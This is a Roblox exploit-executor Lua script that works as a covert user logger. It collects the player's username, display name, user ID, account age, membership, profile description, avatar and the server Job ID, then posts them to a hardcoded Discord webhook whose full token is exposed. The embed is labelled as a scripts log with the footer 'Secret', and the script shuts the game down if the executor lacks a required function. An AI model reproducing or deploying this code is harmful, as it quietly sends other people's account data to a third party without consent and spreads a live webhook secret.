getgenv().Notify = true
local Notify_Webhook = "https://discord.com/api/webhooks/1327636232598978591/Bw3Z_caU35K_BldqiTJt5DiySH8wIiqNt1qEEPTEoMzEQatAZPLnNy6px6YvkAZDa8kK"

if not getcustomasset then
	game:Shutdown() -- Fucked out
end

local HttpService = game:GetService('HttpService')

function notify_hook()
	-- Thumb API
	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
	local json = HttpService:JSONDecode(ThumbnailAPI)
	local avatardata = json.data[1].imageUrl

	-------- User API Script
	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
	local json = HttpService:JSONDecode(UserAPI)
	-------- Description Data
	local DescriptionData = json.description
	-------- Created Data
	local CreatedData = json.created

	local send_data = {
		["username"] = "???",
		["avatar_url"] = "https://cdn.discordapp.com/attachments/1358123525420093485/1366413655876436090/Relax_Sky.png?ex=6810db62&is=680f89e2&hm=9bf232abcab178192a74b28e96c25e29ea3cbe5d8bd7f4f08f1b2a5b49968515&",
		["content"] = "Data Was Here !",
		["embeds"] = {
			{
				["title"] = "Running's Scrips Log",
				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
				["color"] = 4915083,
				["fields"] = {
					{
						["name"] = "Username",
						["value"] = player.Name,
						["inline"] = true
					},
					{
						["name"] = "Display Name",
						["value"] = player.DisplayName,
						["inline"] = true
					},
					{
						["name"] = "User ID",
						["value"] = player.UserId,
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = player.AccountAge.." Day",
						["inline"] = true
					},
					{
						["name"] = "Membership",
						["value"] = player.MembershipType.Name,
						["inline"] = true
					},
					{
						["name"] = "Account Created Day",
						["value"] = string.match(CreatedData, "^([%d-]+)"),
						["inline"] = true
					},
					{
						["name"] = "Profile Description",
						["value"] = "```\n"..DescriptionData.."\n```",
						["inline"] = true
					}
				},
				["footer"] = {
					["text"] = "Secret",
					["icon_url"] = "https://cdn.discordapp.com/attachments/1358123525420093485/1366414453872132207/bro_cooked.png?ex=6810dc20&is=680f8aa0&hm=9789bb938f9227993ac74e0f6505db545b18f0180ec6bdde95352b9c5fe9b451&"
				},
				["thumbnail"] = {
					["url"] = avatardata
				}
			}
		},
	}

	local headers = {
		["Content-Type"] = "application/json"
	}

	request({
		Url = Notify_Webhook,
		Method = "POST",
		Headers = headers,
		Body = game:GetService("HttpService"):JSONEncode(send_data)
	})
end

if getgenv().Notify == true then
	if Notify_Webhook == '' then
		return;
	else
		notify_hook()
	end
elseif getgenv().Notify == false then
	return;
else
	warn("True or False")
end